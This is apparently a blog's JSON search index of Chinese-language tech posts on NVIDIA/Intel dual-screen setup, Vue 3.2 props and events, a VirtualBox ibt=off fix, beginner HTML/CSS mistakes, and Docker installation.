*.desktop 文件来配置 GDM。 写入文件 /usr/share/gdm/greeter/autostart/optimus.desktop 和 /etc/xdg/autostart/optimus.desktop [Desktop Entry] Type=Application Name=Optimus Exec=sh -c \"xrandr --setprovideroutputsource modesetting NVIDIA-0; xrandr --auto\" NoDisplay=true X-GNOME-Autostart-Phase=DisplayServer 最后，经过重启，终于解决了这些问题。 好耶！ ","date":"2023-09-21","objectID":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/:7:0","tags":["多显卡","NVIDIA","Intel","Arch Linux","Linux","NVIDIA 驱动","X11","问题解决"],"title":"解决 NVIDIA 和 Intel GPU 双屏问题","uri":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/"},{"categories":["问题解决"],"content":"参考连接 Phind.com NVIDIA Optimus - ArchWiki #Use_NVIDIA_graphics_only NVIDIA Optimus - ArchWiki #GDM ","date":"2023-09-21","objectID":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/:8:0","tags":["多显卡","NVIDIA","Intel","Arch Linux","Linux","NVIDIA 驱动","X11","问题解决"],"title":"解决 NVIDIA 和 Intel GPU 双屏问题","uri":"/zh-cn/posts/solve_the_problem_of_dual_screen_with_nvidia_and_intel_gpus/"},{"categories":["编程"],"content":"一个记录一些前端开发方法的文章。","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"介绍 Vue 是一种流行的 JavaScript 框架，用于构建交互式的网页界面。它易于学习、多功能，并拥有一个支持性强的社区。 使用 Vue 开发单页面应用非常方便。 然而，在父组件和子组件之间传递值的场景中，有时候可能会遇到一些挑战。 还不清楚？想象一下这种情景：你创建了一个按钮，希望它可以控制一个 \u003cp\u003e\u003c/p\u003e 元素的内容，以满足特定的开发需求。 这时，就该将不同的值传递给 ChildComponent，来改变属性或触发事件了。 ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:1:0","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"从父组件传递值给子组件的方法 ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:2:0","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"步骤 1：创建父组件 为父组件创建一个新的 Vue 组件文件（例如 ParentComponent.vue）。 在组件的模板中，定义父组件的内容并包含子组件。 \u003ctemplate\u003e \u003cdiv class=\"FatherBox\"\u003e \u003cChildComponent /\u003e \u003cbutton\u003e\u003c/button\u003e \u003c/div\u003e \u003c/template\u003e 通过添加必要的导入语句导入子组件。 \u003cscript lang=\"ts\"\u003e import ChildComponent from './ChildComponent.vue'; \u003c/script\u003e 在父组件的 components 属性中注册子组件。 \u003cscript lang=\"ts\"\u003e export default { components: { ChildComponent, }, } \u003c/script\u003e ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:2:1","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"步骤 2：在父组件中定义数据。 在父组件的脚本部分中，定义一个数据属性来存储将传递给子组件的值。 \u003cscript lang=\"ts\"\u003e export default { data() { return { }; }, } \u003c/script\u003e 给数据属性赋初始值。这将是最初传递给子组件的值。 \u003cscript lang=\"ts\"\u003e export default { data() { return { message: 'Hello from the parent component!', // Value to pass to child component }; }, } \u003c/script\u003e ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:2:2","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"步骤3：将数据作为属性传递给子组件 在父组件的模板中，添加子组件并使用冒号（:）绑定将数据属性作为 prop 传递给子组件。 \u003ctemplate\u003e \u003cdiv class=\"FatherBox\"\u003e \u003cChildComponent :message=\"message\" /\u003e \u003c/div\u003e \u003c/template\u003e 在子组件中，prop 的名称应与在父组件中传递 prop 时选择的名称相匹配。 \u003cscript lang=\"ts\"\u003e import ChildComponent from './ChildComponent.vue'; export default { components: { ChildComponent, }, data() { return { message: 'Hello from the parent component!', // Value to pass to child component }; }, methods: { changeMessage() { this.message = 'New message from parent!'; }, } }; \u003c/script\u003e ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:2:3","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"步骤4：创建子组件 为子组件创建一个新的 Vue 组件文件（例如，ChildComponent.vue）。 在子组件的模板中，定义子组件的内容。这将包括呈现从组件传递的 prop 值。 \u003ctemplate\u003e \u003cdiv\u003e \u003cp\u003e{{ message }}\u003c/p\u003e \u003c/div\u003e \u003c/template\u003e ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:2:4","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"步骤5：在子组件中定义 prop。 在子组件的脚本部分中，定义用于接收父组件发送的数据的 prop。 \u003cscript lang=\"ts\"\u003e export default { props: { message: { }, }, }; \u003c/script\u003e 为了确保数据的完整性，可以指定 prop 的类型（例如 String、Number 等）。如果必须传递该 prop，则还可以设置 required: true。 message: { type: String, required: true, }, ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:2:5","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"第六步：从子组件发出事件 在子组件的脚本中，定义一个方法来发出事件，与父组件进行通信。 methods: { changeMessage() { const newMessage = 'New message from child!'; }, }, 在该方法内部，使用 this.emit('事件名称',数据)来发出事件。选择一个合适的事件名称，并将任何相关数据递给父组件。 methods: { changeMessage() { const newMessage = 'New message from child!'; this.$emit('update-message', newMessage); }, }, ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:2:6","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"第七步：在父组件中处理事件 在父组件的脚本中，定义一个方法来处理子组件发出的事件。 updateMessage(newMessage: any) { }, 在父组件的模板中，通过使用 @event-name=\"methodName\" 为子组件实例添加事件监听器。 \u003ctemplate\u003e \u003cChildComponent :message=\"message\" @update-message=\"updateMessage\" /\u003e \u003c/template\u003e 在该方法中，将发出的数据作为参数接收，并相应地更新父件的数据。 updateMessage(newMessage: any) { this.message = newMessage; }, ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:2:7","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"完整代码 父组件: \u003ctemplate\u003e \u003cdiv class=\"FatherBox\"\u003e \u003cChildComponent :message=\"message\" @update-message=\"updateMessage\" /\u003e \u003cbutton @click=\"changeMessage\"\u003eChange Message By ParentComponent\u003c/button\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript lang=\"ts\"\u003e import ChildComponent from './ChildComponent.vue'; export default { components: { ChildComponent, }, data() { return { message: 'Hello from the parent component!', // Value to pass to child component }; }, methods: { updateMessage(newMessage: any) { this.message = newMessage; }, changeMessage() { this.message = 'New message from parent!'; }, }, }; \u003c/script\u003e \u003cstyle scoped\u003e .FatherBox { background-color: #f1f1f1; border-radius: 20px; box-shadow: 0 5px 5px rgba(0, 0, 0, 0.2); padding: 20px; } \u003c/style\u003e 子组件: \u003ctemplate\u003e \u003cdiv\u003e \u003cp\u003e{{ message }}\u003c/p\u003e \u003cbutton @click=\"changeMessage\"\u003eChange Message\u003c/button\u003e \u003c/div\u003e \u003c/template\u003e \u003cscript lang=\"ts\"\u003e export default { props: { message: { }, }, methods: { changeMessage() { const newMessage = 'New message from child!'; this.$emit('update-message', newMessage); }, }, }; \u003c/script\u003e ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:2:8","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"测试 然后我们可以执行 yarn dev 来启动开发服务器，然后我们就可以看到一个类似这样的页面： 现在让我们尝试点击第一个按钮！ 显然！文本的内容发生了变化！ 那么让我们点击第二个按钮吧！ 它变成了\"New message from parent!\" 是不是很神奇呢？ ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:3:0","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["编程"],"content":"结语 没错！通过按照这些步骤，在Vue.js中可以成功地通过props和事件将值从父组件传给子组件。不要忘记保存文件，根据需要导组件，并适当注册组件。 ","date":"2023-07-22","objectID":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/:4:0","tags":["Vue","前端","Javascript","Web","开发","编程"],"title":"如何在Vue 3.2中从父组件传递一个值给子组件？","uri":"/zh-cn/posts/how_to_transfer_a_value_from_the_parent_component_to_the_child_component_in_vue_3.2/"},{"categories":["问题解决"],"content":"尝试解决最近 VirtualBox 启动虚拟机时卡在 Starting 的问题, 据说最近又出了个大新闻，这个问题通过设置内核参数 ibk=off 就解决了。","date":"2023-03-06","objectID":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/","tags":["VirtualBox","Linux","KVM","Kernerl","虚拟机","Virtual Machine","Grub","ibt=off"],"title":"尝试解决最近 VirtualBox 启动虚拟机时卡在 Starting 的问题","uri":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["问题解决"],"content":"序：遇到了啥问题啊？ 今天心血来潮想要玩一下 VirtualBox 虚拟机， 结果发现打开之后每个虚拟机都卡在 Starting virutal machine.。 首先遇到问题的第一步就是去谷歌。 嗯… 查到了两篇 Arch 官方论坛的帖子。 Virtualbox hangs on Starting virtual machine window / Newbie Corner / Arch Linux Forums KVM busted in linux 5.18 due to Intel CET / Kernel \u0026 Hardware / Arch Linux Forums 读完两篇帖子之后，我发现是因为 KVM 在新版本的内核中产生了一个 bug 导致的。 已经有大佬提交了 Bug 报告了。 FS#75481 : [linux] VBox virtual machines stop functioning x86/ibt: Add IBT feature, MSR and #CP handling · torvalds/linux@991625f · GitHub 至于这个 Bug 是怎么产生… 咱笨笨，不知道 想想怎么解决 根据阅读帖子里的内容，得到的解决方法都是设置内核参数 ibt=off。 Thank you appending ibt=off to kernel boot params fixed my problem. ","date":"2023-03-06","objectID":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/:0:0","tags":["VirtualBox","Linux","KVM","Kernerl","虚拟机","Virtual Machine","Grub","ibt=off"],"title":"尝试解决最近 VirtualBox 启动虚拟机时卡在 Starting 的问题","uri":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["问题解决"],"content":"怎么设置内核启动参数呢？ 我并不知道这个，所以我还是去谷歌查了，得到了方法。 How to set kernel boot parameters on Linux - Linux Tutorials - Learn Linux Configuration 此时能看懂英文的读者可以参考上面这条链接去解决问题了，但是如果英文阅读比较困难的话，也可以跟着本文的步骤走。 ","date":"2023-03-06","objectID":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/:1:0","tags":["VirtualBox","Linux","KVM","Kernerl","虚拟机","Virtual Machine","Grub","ibt=off"],"title":"尝试解决最近 VirtualBox 启动虚拟机时卡在 Starting 的问题","uri":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["问题解决"],"content":"设想的解决方法 其实就是编辑 /etc/defualt/grub 这个文件的 GRUB_CMDLINE_LINUX=\"\" 的值。 然后往这里面写 \"ibt=off\" 解决步骤 ","date":"2023-03-06","objectID":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/:2:0","tags":["VirtualBox","Linux","KVM","Kernerl","虚拟机","Virtual Machine","Grub","ibt=off"],"title":"尝试解决最近 VirtualBox 启动虚拟机时卡在 Starting 的问题","uri":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["问题解决"],"content":"1. 编辑 /etc/default/grub 文件 编辑这个文件的目的是设置内核启动参数，在不同的启动引导器引导的系统中，设置这个玩意的方法也有所不同，由于我的 Arch 用的是 Grub， 所以我需要编辑这个文件。 $ sudo vim /etc/default/grub 找到 GRUB_CMDLINE_LINUX=\"\" 关键字，并设置参数 ibt=off # GRUB boot loader configuration GRUB_DEFAULT=0 GRUB_TIMEOUT=5 GRUB_DISTRIBUTOR=\"Arch\" GRUB_CMDLINE_LINUX_DEFAULT=\"loglevel=7\" GRUB_CMDLINE_LINUX=\"ibt=off\" ...... 按 : 输入 wq 回车（基础操作了，不多解释）。 ","date":"2023-03-06","objectID":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/:3:0","tags":["VirtualBox","Linux","KVM","Kernerl","虚拟机","Virtual Machine","Grub","ibt=off"],"title":"尝试解决最近 VirtualBox 启动虚拟机时卡在 Starting 的问题","uri":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["问题解决"],"content":"2. 重新生成 Grub 配置文件 然后重新生成 Grub 配置文件 $ sudo grub-mkconfig -o /boot/grub/grub.cfg 等待操作，在没有报错的情况下，可以重启操作系统了。 $ sudo reboot 测试和验证 重启之后再次打开 VirutalBox， 然后启动一个虚拟机，此时发现虚拟机已经进入了系统。 这意味着问题得到了解决。 ","date":"2023-03-06","objectID":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/:4:0","tags":["VirtualBox","Linux","KVM","Kernerl","虚拟机","Virtual Machine","Grub","ibt=off"],"title":"尝试解决最近 VirtualBox 启动虚拟机时卡在 Starting 的问题","uri":"/zh-cn/posts/problem_of_virtualbox_appeding_starting_vm/"},{"categories":["Web"],"content":"序 很多初学者在学 HTML 和 CSS 的时候总是遇到一些低级的问题就望而却步… 我本来是实在不想写基础类的内容的，但是感觉有些人可能就需要看这种内容… 就写一些吧 要说的也不多，就是语法和用法上的问题。 我已经发现的常见问题 ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:0:0","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["Web"],"content":"HTML 语法问题 ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:1:0","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["Web"],"content":"标签顺序问题 我经常被人问：“为什么我的标签写上去之后内容显示不出来？为什么我这个显示不了… ” 之类的问题。 我第一个被问到的是为什么标题（\u003ch1\u003e 标签）的内容显示不出来，我看一眼他的代码: \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cp\u003e ppp \u003ch1\u003eTT\u003c/h1\u003e pppp \u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 麻了，我血压一下子就上来了，居然把 h1 标签套进 p 里面去… 这里很明显是对这两个标签都不太熟， \u003ch1\u003e 和 \u003cp\u003e 都是块级元素的标签，且默认情况下 \u003ch1\u003e 的字体是比 \u003cp\u003e 要大的，因此放进去之后可能会显示错误，正常情况下，这两个标签是平级存在的，两者都会独占一整行来显示。如果大的\u003ch1\u003e套进小的里面去的话，当然就看不到啦~ 总的来说段落里面不能有标题，二者不能互相嵌套。 所以正确的写法应该是这样的： \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eThe Title Of An article.\u003c/h1\u003e \u003cp\u003eThe Paragraph.\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:1:1","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["Web"],"content":"丢符号的问题， 有时候也因为这个问题被问到，我感觉这都是低级错误。 打开代码一看， 妈也， 这是什么玩意 很明显这就是不规范的 HTML。 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" \u003e \u003ctitle\u003eTest\u003c/title \u003c/head\u003e \u003cbody\u003e \u003cdiv\u003e \u003ch1\u003eTest\u003c/h1 \u003cp Text\u003c/p\u003e \u003cdiv\u003e /body\u003e \u003c/html\u003e 这种代码…. 要么是打的时候不认真，要么也是没有熟悉这些标签的用法。 或者是说，不知道标签怎么表示 那这里就再解释一下， 标签有两种，单标签和双标签 以插入图片的标签为例，单标签是这样的: \u003cimg /\u003e， 前面的 \u003c 和后面的 \u003e 都不能丢， 而且最好在末尾的 \u003e 前面加个 /。 双标签就以段落为例吧： \u003cp\u003e这是一个段落\u003c/p\u003e ，这种双标签有头必有尾。 前面的部分和后面的部分一个都不能丢。 写双标签出现嵌套的时候最好养成一个好习惯，换行缩进 \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\" /\u003e \u003ctitle\u003eTest\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv class=\"Box1\"\u003e \u003cdiv class=\"Box2\"\u003e \u003ch1\u003eTitle\u003c/h1\u003e \u003cul\u003e \u003cli\u003e \u003cp\u003ePara1\u003c/p\u003e \u003c/li\u003e \u003cli\u003e \u003cp\u003ePara2\u003c/p\u003e \u003c/li\u003e \u003c/ul\u003e \u003c/div\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e 这样的话，代码不仅美观，而且后期维护起来也会轻松很多，出了问题也好找。 ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:1:2","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["Web"],"content":"分不清 \u003chead\u003e 和 \u003cbody\u003e 除了上面的问题以外，甚至还有在 \u003chead\u003e 里面写 \u003cdiv\u003e 的，这就说明还没有分清楚 HTML 的头部信息区和内容显示区。 我只能这样解释了： \u003chead\u003e 里面是头部信息区，这个是服务器给浏览器看的，里面的代码并不会渲染在浏览器的页面上。 \u003cbody\u003e 则是内容显示区，用来写那些能够被显示出来的标签的，也可以写 \u003cscript\u003e 标签然后套 js 代码，但是 CSS 样式不能写在这里。 ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:1:3","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["Web"],"content":"CSS 的问题 除了 HTML 的语法问题和区域分不清的问题以外，在写 CSS 的时候也有不少人问我一些奇葩问题。 ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:2:0","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["Web"],"content":"引用样式的方法 引用 CSS 样式表的方法，按教科书来说有三种，但是常用的也就两种。 我个人最喜欢的是用 \u003clink\u003e 来链入，这样可以分为两个文件然后分屏写，很方便。 不需要像行内式一样把屏幕翻来翻去。 至于行内式？用得少，我几乎在实践当中没用过。 不过到现在为止居然还有人不会链入式？ 最主要的是不清楚路径这个概念。 其实很简单，只需要把相对路径记住，然后再把相对路径填入 \u003clink\u003e 标签的 href 属性值里面就行了。 \u003clink type=\"text/css\" rel=\"stylesheet\" href=\"css/style.css\" /\u003e 当然，内嵌式也还是有人不会的，这没什么好说的，一定记得 \u003cstyle\u003e 标签要写在 \u003chead\u003e 里面，然后按照正确的 CSS 格式在 \u003cstyle\u003e 标签里面写样式就行。 例如： \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cstyle type=\"text/css\"\u003e *{ margin: 0; padding: 0; } .TopHead{ background-color: white; border: solid 1px black; width: 100px; height: 200px; } \u003c/style\u003e \u003cbody\u003e \u003cdiv class=\"TopHead\"\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:2:1","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["Web"],"content":"写 CSS 的时候丢 ; 、{ 和 } ，和拼错单词 这种呢都是低级错误，多练练多注意就好…. 正确模板是这样的： 选择器{ 属性: 属性值; } .TopHead{ background-color: white; border: solid 1px black; width: 100px; height: 200px; } ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:2:2","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["Web"],"content":"消除默认内外边距 很多初学者在写 CSS 的时候没有养成先消除默认内外边距的习惯，这导致写到后期会发现样式越来越难调。 其实很简单: *{ margin: 0; padding: 0; } * 是个正则通配符，在 CSS 里面它的优先级是最低的，而在一切开始之前将它的 margin 属性和 padding 属性设置为0可以消除所有的元素在没被选择器选择的时候的内外边距清除，便于后期对它进行更准确的设定。 还是不知道写不写有什么区别？你试试就知道了。 ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:2:3","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["Web"],"content":"使用类选择器、ID 选择器的时候命名不规范 这个问题也很大，非常影响代码的可读性和后期管理性。 我是经常看到这样的: .a1{ } .a2{ } #b1{ } #b2{ } 这就很难去找它到底选择的是个什么元素，增加了工作量…. 因为第一眼看上去完全就不知道它指的是什么。 还有用中文的，虽然我在初中的时候写这玩意也喜欢用中文，但是这个习惯也很不好，如果有一些服务器的编码炸了，样式文件也很容易加载不出来。 h1.中央标题 { text-align:center; font-size:22px; } h1.一级标题 { font-size:22px; } h2.二级标题 { font-size:20px; } h2.三级标题 { font-size:18px; } h2.四级标题 { font-size:16px; } p.普通文字 { text-indent:25px; font-size:15px; text-align:justify; } 但是甚至还有用数字的！ 然后问我为什么不显示！ .1{ color: red; } 数字和数字开头的名字是不能作为类选择器名称和ID的，其次在很多编程语言中也不能使用数字或者数字开头的名字来给变量命名。 而比较好的命名方法有驼峰法和_拼接法。 大驼峰是指两个单词拼在一起，两个首字母都大写，比如 TopHead。 小驼峰是指两个单词拼在一起，只有后面那个词的首字母大写，比如 contentPlace。 而两个以上单词的命名就需要 _ 来拼接了，比如 the_menu_bar。 .TopHead{ width: 1000px; height: 300px; } .contentPlace{ width: 1000px; height: auto; } .the_menu_bar{ width: 100%; height: 50px; background-color: blue; } 这样可读性就高多了，一般来说都知道哪个对应哪个，不需要费那么多眼神去一个一个找了。 结尾 以上只是我个人对目前已经发现的初学者学习 HTML 和 CSS 会出现的小问题的一些看法和方法。 也许还有更多问题我没发现的… 其实你可以到下面的评论插件吐槽…. ","date":"2022-11-17","objectID":"/zh-cn/posts/something-about-html-css/:2:4","tags":["HTML","CSS","前端","网页设计","基础","吐槽"],"title":"关于写 HTML CSS 的时候一些想说的话","uri":"/zh-cn/posts/something-about-html-css/"},{"categories":["运维"],"content":"迟早要学的 Docker ， 先尝试一下吧","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"序 嗯，未雨绸缪，提前学一下怎么玩 docker 。 卷死他们 docker 是什么？ 官方英文简介 Docker is an open platform for developing, shipping, and running applications. Docker enables you to separate your applications from your infrastructure so you can deliver software quickly. With Docker, you can manage your infrastructure in the same ways you manage your applications. By taking advantage of Docker’s methodologies for shipping, testing, and deploying code quickly, you can significantly reduce the delay between writing code and running it in production. 根据官方文档的说明和通俗的理解， docker 能够提供快速部署软件项目的容器，它相当于一个可以模拟项目所需环境的虚拟机，但又和我们理解的一般的虚拟机又不同。 一般的虚拟机需要安装整个操作系统，会对我们的计算机占用大量的资源，而 docker 只需要模拟出项目所需要的运行环境，占用率非常低，这可以大大提高开发效率。 它可以按照我们的需求模拟出软件环境，并且能够快速部署我们开发好的项目实例（比如 Mastodon），并且一定程度上它具有环境隔离功能，运行环境与操作系统相分离，而且可以同时运行多个容器。 并且我们可以把容器封装成镜像，进行反复利用。 就像这条运着集装箱的鲸鱼一样，游到哪都是开箱即用。 怎么安装 docker 各个平台装 docker 都非常简单。 Linux 平台可能对初学者稍微难一些，但是对熟悉的用户来说， Linux 安装 docker 非常快。 直接从相应发行版的包管理器安装就行。 ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:0:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"Arch 比如咱 Arch 可以让 pacman 把这条鲸鱼给带回来。 sudo pacman -S docker 注意 如果运行时出现以下报错 docker: Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?. See 'docker run --help'. 请使用 systemctl 启动 docker 的系统进程。 sudo systemctl start docker 如果有必要，设置其开机自启 sudo systemctl enable docker ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:1:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"Debian 如果是用 deb 系的发行版，可以参考官方文档用 apt 来安装。 ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:2:0","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 Docker","uri":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/"},{"categories":["运维"],"content":"设置仓库 更新 apt 仓库，并安装一些依赖来允许 apt 通过 https 使用第三方仓库。 sudo apt update sudo apt install ca-certificates curl gnupg lsb-release 添加 Docker 官方 GPG 密钥 sudo mkdir -p /etc/apt/keyrings curl -fsSL https://download.docker.com/linux/debian/gpg | sudo gpg --dearmor -o /etc/apt/keyrings/docker.gpg 设置 Docker 仓库 echo \\ \"deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] https://download.docker.com/linux/debian \\ $(lsb_release -cs) stable\" | sudo tee /etc/apt/sources.list.d/docker.list \u003e /dev/null ","date":"2022-10-15","objectID":"/zh-cn/posts/%E6%B5%85%E5%B0%9Ddocker/:2:1","tags":["docker","运维","容器","Linux","Web","云计算","云服务"],"title":"浅尝 